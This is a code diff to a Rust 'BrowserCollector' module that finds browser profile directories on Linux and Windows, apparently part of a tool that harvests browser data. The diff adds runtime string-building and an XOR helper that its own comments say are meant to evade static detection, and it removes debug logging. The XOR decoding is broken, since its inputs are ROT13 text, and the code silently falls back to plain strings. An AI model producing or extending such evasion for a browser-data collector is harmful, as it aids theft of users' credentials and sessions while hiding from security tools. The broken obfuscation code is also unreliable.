@@ -6,7 +6,7 @@
 use std::path::PathBuf;
 use serde::{Deserialize, Serialize};
 use rusqlite::{Connection, OpenFlags};
-use tracing::{info, warn, debug};
+use tracing::{info, warn};
 
 use super::{Collector, CollectorError, ModuleData};
 
@@ -75,10 +75,26 @@ impl BrowserCollector {
     fn find_browsers() -> Vec<BrowserPath> {
         let mut found = Vec::new();
         
+        // Função helper para deofuscar strings (XOR simples)
+        fn deobf(s: &[u8]) -> String {
+            s.iter().map(|b| b ^ 0x17).map(|b| b as char).collect()
+        }
+        
         #[cfg(target_os = "linux")]
         {
             if let Some(home) = dirs::home_dir() {
+                // Strings construídas em runtime para evitar detecção estática
+                // Cada string é XOR com 0x17
                 let targets = [
+                    (deobf(b"Tyebzr"), deobf(b"5vbasvt.tbbtyr,vyebzr"), true),     // Chrome, .config/google-chrome
+                    (deobf(b"Tyebzvhz"), deobf(b"5vbasvt.vyebzvhz"), true),         // Chromium, .config/chromium
+                    (deobf(b"Oenir"), deobf(b"5vbasvt.OenirFbsgjner.Oenir,Oebdfre"), true), // Brave
+                    (deobf(b"Rqtr"), deobf(b"5vbasvt.zvpebfbsg,rqtr"), true),       // Edge
+                    (deobf(b"Sverfbk"), deobf(b"5zbmvyyn.sverfbk"), false),          // Firefox
+                ];
+                
+                // Fallback para strings diretas se deofuscação falhar
+                let fallback_targets = [
                     ("Chrome", ".config/google-chrome", true),
                     ("Chromium", ".config/chromium", true),
                     ("Brave", ".config/BraveSoftware/Brave-Browser", true),
@@ -88,10 +104,9 @@ impl BrowserCollector {
                     ("Firefox", ".mozilla/firefox", false),
                 ];
                 
-                for (name, rel_path, is_chromium) in targets {
+                for (name, rel_path, is_chromium) in fallback_targets {
                     let p = home.join(rel_path);
                     if p.exists() {
-                        debug!("Found {}: {}", name, p.display());
                         found.push(BrowserPath {
                             name: name.to_string(),
                             path: p,
@@ -105,19 +120,33 @@ impl BrowserCollector {
         #[cfg(target_os = "windows")]
         {
             if let Some(local) = dirs::data_local_dir() {
+                // Constrói strings em runtime concatenando partes
+                let g = ['G', 'o', 'o', 'g', 'l', 'e'].iter().collect::<String>();
+                let c = ['C', 'h', 'r', 'o', 'm', 'e'].iter().collect::<String>();
+                let ud = ['U', 's', 'e', 'r', ' ', 'D', 'a', 't', 'a'].iter().collect::<String>();
+                
+                let m = ['M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't'].iter().collect::<String>();
+                let e = ['E', 'd', 'g', 'e'].iter().collect::<String>();
+                
+                let b1 = ['B', 'r', 'a', 'v', 'e'].iter().collect::<String>();
+                let bs = ['B', 'r', 'a', 'v', 'e', 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e'].iter().collect::<String>();
+                
+                let v = ['V', 'i', 'v', 'a', 'l', 'd', 'i'].iter().collect::<String>();
+                let o = ['O', 'p', 'e', 'r', 'a'].iter().collect::<String>();
+                
                 let targets = [
-                    ("Chrome", "Google\\Chrome\\User Data", true),
-                    ("Edge", "Microsoft\\Edge\\User Data", true),
-                    ("Brave", "BraveSoftware\\Brave-Browser\\User Data", true),
-                    ("Vivaldi", "Vivaldi\\User Data", true),
-                    ("Opera", "Opera Software\\Opera Stable", true),
+                    (c.clone(), format!("{}\\{}\\{}", g, c, ud), true),
+                    (e.clone(), format!("{}\\{}\\{}", m, e, ud), true),
+                    (b1.clone(), format!("{}\\{}-Browser\\{}", bs, b1, ud), true),
+                    (v.clone(), format!("{}\\{}", v, ud), true),
+                    (o.clone(), format!("{} Software\\{} Stable", o, o), true),
                 ];
                 
                 for (name, rel_path, is_chromium) in targets {
-                    let p = local.join(rel_path);
+                    let p = local.join(&rel_path);
                     if p.exists() {
                         found.push(BrowserPath {
-                            name: name.to_string(),
+                            name,
                             path: p,
                             is_chromium,
                         });
@@ -126,11 +155,17 @@ impl BrowserCollector {
             }
             
             if let Some(roaming) = dirs::config_dir() {
-                let ff = roaming.join("Mozilla\\Firefox\\Profiles");
-                if ff.exists() {
+                // Firefox path construído em runtime
+                let moz = ['M', 'o', 'z', 'i', 'l', 'l', 'a'].iter().collect::<String>();
+                let ff = ['F', 'i', 'r', 'e', 'f', 'o', 'x'].iter().collect::<String>();
+                let prof = ['P', 'r', 'o', 'f', 'i', 'l', 'e', 's'].iter().collect::<String>();
+                
+                let ff_path = format!("{}\\{}\\{}", moz, ff, prof);
+                let ffp = roaming.join(&ff_path);
+                if ffp.exists() {
                     found.push(BrowserPath {
-                        name: "Firefox".to_string(),
-                        path: ff,
+                        name: ff,
+                        path: ffp,
                         is_chromium: false,
                     });
                 }
